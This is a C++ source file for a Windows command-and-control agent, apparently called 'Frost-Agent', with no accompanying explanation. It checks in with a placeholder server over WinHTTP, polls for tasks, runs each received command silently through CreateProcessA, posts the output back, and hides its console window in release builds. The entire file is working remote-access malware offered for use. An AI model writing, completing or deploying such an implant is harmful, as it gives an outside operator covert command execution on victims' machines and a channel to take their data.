#include <windows.h>
#include <winhttp.h>
#include <iostream>
#include <json.hpp>
#include <chrono>
#include <thread>
#include <vector>

using nlohmann::json_abi_v3_12_0::json;

#define FAIL(function) printf("\n#####\n[!] %s %d\n#####\n\n", function, GetLastError() );
#define DEBUG

class Agent{

  public:
    DWORD         TaskId          { };

    std::string   Task            { },
                  output          { };

    std::vector<DWORD> oldTasksId { };

    Agent( std::wstring Address=L"127.0.0.1", INTERNET_PORT Port=5000 )
      : m_ServerAddress( Address ),  m_ServerPort( Port ){
      #ifdef DEBUG
            std::cout << "Agent Constructed\n\n";
      #endif
    }

    INTERNET_PORT GetPort(){
      return m_ServerPort;
    }

    std::wstring GetAddress(){
      return m_ServerAddress;
    }

    void SetAgentId( std::wstring agentId ){
        m_AgentId = agentId;
    }

    std::wstring GetAgentId(){
      return m_AgentId;
    }

  private:
    std::wstring  m_ServerAddress { };
    INTERNET_PORT m_ServerPort    { };
    std::wstring  m_AgentId       { };

};

json MakeConnection( Agent* agent, std::wstring path, std::wstring method, std::string data="" )
{
  //
  // Sends http requests
  //

  HINTERNET         hSession         { },
                    hConnect         { },
                    hRequest         { };

  BOOL              hResults         { };

  DWORD             dwBytesAvailable { };
  
  json              parsedJson       { };

  std::vector<BYTE> buffer           { };

  std::wstring      Headers          {L"Content-Type: application/json"};

  hSession = WinHttpOpen( L"Frost-Agent", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, WINHTTP_FLAG_ASYNC );
 
      if ( !hSession ){
#ifdef DEBUG
        FAIL("WinHttpOpen");
#endif
        goto __CLEANUP__;
      }

 
  
  hConnect = WinHttpConnect( hSession, agent->GetAddress().c_str(), agent->GetPort(), 0 );

       if ( !hConnect ){
#ifdef DEBUG
         FAIL("WinHttpConnect");
#endif
         goto __CLEANUP__;
       }

  
  hRequest = WinHttpOpenRequest( hConnect, method.c_str(), path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH );

      if ( !hRequest ){
#ifdef DEBUG
        FAIL("WinHttpOpenRequest");
#endif
        goto __CLEANUP__;
      }

  // Check if function has post data
  if ( !data.empty() ){
      hResults = WinHttpSendRequest( hRequest, Headers.c_str(), 0, data.data(), data.size(), data.size(), 0 );
  #ifdef DEBUG
      std::wcout << L"POST DATA SENT: " << data.c_str() << '\n';
  #endif
  }
  
  else
      hResults = WinHttpSendRequest( hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0 );
  
      if ( !hResults ){
#ifdef DEBUG
        FAIL("WinHttpSendRequest");
#endif
        goto __CLEANUP__;
      }

  
  hResults = WinHttpReceiveResponse( hRequest, NULL );
  

    if ( !hResults ){
  #ifdef DEBUG
         FAIL("WinHttpReceiveResponse");
  #endif 
      goto __CLEANUP__;
  }

  
  do {
        dwBytesAvailable = 0;

        WinHttpQueryDataAvailable( hRequest, &dwBytesAvailable );

        // If No available bytes then break
        if ( !dwBytesAvailable )
          break;

        // Get Data
        std::vector<BYTE>  temp      ( dwBytesAvailable );
        WinHttpReadData( hRequest , temp.data(), dwBytesAvailable, NULL );

        // Write temp into buffer
        buffer.insert( buffer.end(), temp.begin(), temp.end() );

    } while ( dwBytesAvailable > 0 );


  __CLEANUP__:
 // #ifdef DEBUG
 //         std::printf("[+] Closing Taskid %d handles\n", agent->TaskId);
 // #endif
      if ( hSession ) WinHttpCloseHandle( hSession );
      if ( hConnect ) WinHttpCloseHandle( hConnect );
      if ( hRequest ) WinHttpCloseHandle( hRequest );
  
  // Get json data
  std::string   jsonData( buffer.begin(), buffer.end() );
  
  if ( jsonData.empty() ){
    return json::object();
  }

  parsedJson    = json::parse( jsonData );

#ifdef DEBUG
     std::cout << "\njsonData for Taskid " << agent->TaskId << ": " << jsonData << "\n\n";
#endif // DEBUG
      return parsedJson;
}


void CheckIn( Agent* agent ){
  //
  // Check-in The agent
  //
  std::string jsonData   { },
              results    { };

  json        registered { },
              data       { };

  data["checkin"] = "true";
  
  jsonData   = data.dump();

  registered = MakeConnection( agent, L"/register", L"POST", jsonData.c_str() );
  
    try {
      results    = registered["SUCCESS"];
  }
  catch (const nlohmann::json::exception& e) {
    std::cout << "JSON ERROR CheckIn()\n";
  }
  
  std::wstring resultsWstr( results.begin(), results.end() );
  agent->SetAgentId( resultsWstr );

#ifdef DEBUG
  std::wcout << L"Agent ID: " << agent->GetAgentId() << '\n';
#endif
}

void Ping( Agent* agent ){
  //
  // Ping The Server
  //

  std::string jsonData  { },
              pong      { };

  json        results   { },
              data      { };

   data["ping"]       = "true";
   data["AgentId"]    = agent->GetAgentId().c_str();

  jsonData = data.dump();

  while ( TRUE ){
    std::this_thread::sleep_for(std::chrono::milliseconds( 6000 ) );
    results = MakeConnection( agent, L"/ping", L"POST", jsonData );

    try {
      pong  = results["pong"];
  }
  catch (const nlohmann::json::exception& e) {
    std::cout << "JSON ERROR Ping()\n";
  }

    if ( pong == "null" )
      continue;

  #ifdef DEBUG
      std::printf("\nPong received: %s \n", pong.c_str());
  #endif // DEBUG
   }
 }


void GetTask( Agent* agent ){
  //
  // Keep checking for tasks every 5 seconds
  //

  std::wstring taskPath  { L"/tasks?id=" + agent->GetAgentId() };

  std::string  task      { },
               tid       { },
               aid       { };

  json         results   { };

  while ( TRUE ){
    std::this_thread::sleep_for(std::chrono::milliseconds( 5000 ) );
    results = MakeConnection( agent, taskPath.c_str(), L"GET" );

    try {
      task       = results["cmd"];
      tid        = results["tid"];
      aid        = results["agentId"];
  }
  catch (const nlohmann::json::exception& e) {
    std::cout << "JSON ERROR GetTask()\n";
  }

    if (
           ( task == "None" )  
        || ( task == "null" )  
        || ( std::wstring( aid.begin(), aid.end() ) != agent->GetAgentId() ) 
      )
      continue;

    agent->TaskId = atoi( tid.c_str() );
    agent->Task   = task;

#ifdef DEBUG
    std::printf("TASK: %s  |  ID: %d\n", task.c_str(), agent->TaskId );
#endif
  }

}

void SendResults( Agent* agent ){
  //
  // Send results from ExecuteCommand()
  //

  std::string jsonData   { },
              results    { };

  json        registered { },
              data       { };

  data["result"] = agent->output;
  data["tid"]    = agent->TaskId;

  jsonData   = data.dump();
  MakeConnection( agent, L"results", L"POST", jsonData );

#ifdef DEBUG
  std::cout << "Sent" << jsonData << "\n\n";
#endif // DEBUG
}

void ExecuteCommand( Agent* agent ){
  //
  // Execute Command from task and get results
  //

  std::vector<char> buffer      ( 4096 );

  HANDLE      hWritePipe        { },
              hReadPipe         { };

  DWORD       dwBytesAvailable  { },
              dwBytesRead       { };

  SECURITY_ATTRIBUTES sa        { };

  PROCESS_INFORMATION pi        { };

  STARTUPINFOA        si        { };
  
  sa.bInheritHandle  = TRUE;
  sa.nLength         = sizeof( SECURITY_ATTRIBUTES );

  if ( !CreatePipe( &hReadPipe, &hWritePipe, &sa, 0 ) ){
  #ifdef DEBUG
          FAIL("CreatePipe");
  #endif
        return;
  }

  si.dwFlags         = STARTF_USESTDHANDLES;
  si.cb              = sizeof( STARTUPINFOA );

  si.hStdOutput      = hWritePipe;
  si.hStdError       = hWritePipe;



  if ( !CreateProcessA( NULL, ( char* ) agent->Task.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi ) ){
    #ifdef DEBUG
           FAIL("CREATEPROCESSA");
    #endif
    goto __CLEANUP__;
  }

WaitForSingleObject( pi.hProcess, 2000 );
CloseHandle(hWritePipe);

if ( !PeekNamedPipe( hReadPipe, NULL, 0, NULL, &dwBytesAvailable, NULL ) ) {
#ifdef DEBUG
            FAIL("PeekNamedPipe");
#endif
    goto __CLEANUP__;    
    }

agent->output.clear();

while ( dwBytesAvailable > 0 ) {
            if ( !ReadFile( hReadPipe, buffer.data(), buffer.size() - 1, &dwBytesRead, NULL) || dwBytesRead == 0) {
                break;
            }
            buffer[ dwBytesRead ] = '\0';
            agent->output = buffer.data() ;
            dwBytesAvailable -= dwBytesRead; 
        }

__CLEANUP__:
#ifdef DEBUG
  std::cout << "\n\nOUTPUT: " << agent->output << "\n\n";
#endif
    if ( hReadPipe   ) CloseHandle( hReadPipe   );
    if ( hWritePipe  ) CloseHandle( hWritePipe  );
    if ( pi.hThread  ) CloseHandle( pi.hThread  );
    if ( pi.hProcess ) CloseHandle( pi.hProcess );
}

int main(){
#ifndef DEBUG
    ShowWindow(GetConsoleWindow(), SW_HIDE);
#endif

  Agent agent( L"SERVER_HERE", PORT_HERE );

  // Check-in the agent 
  while ( agent.GetAgentId().empty() ){
    CheckIn( &agent ); 
    std::this_thread::sleep_for( std::chrono::milliseconds( 5000 ) );
  }

  // Keep Checking for tasks
  std::thread t1( GetTask, &agent );

  // Ping The Server
  std::thread t2( Ping, &agent );

  // Execute and send results if agent has a new task id
  while ( TRUE ){
      if ( ( agent.TaskId <= 0 ) || std::find( agent.oldTasksId.begin(), agent.oldTasksId.end(), agent.TaskId ) != agent.oldTasksId.end() )
        continue;

      ExecuteCommand( &agent );
      SendResults   ( &agent );

      // Add task id to the completed task list
      agent.oldTasksId.push_back( agent.TaskId );
  }

}
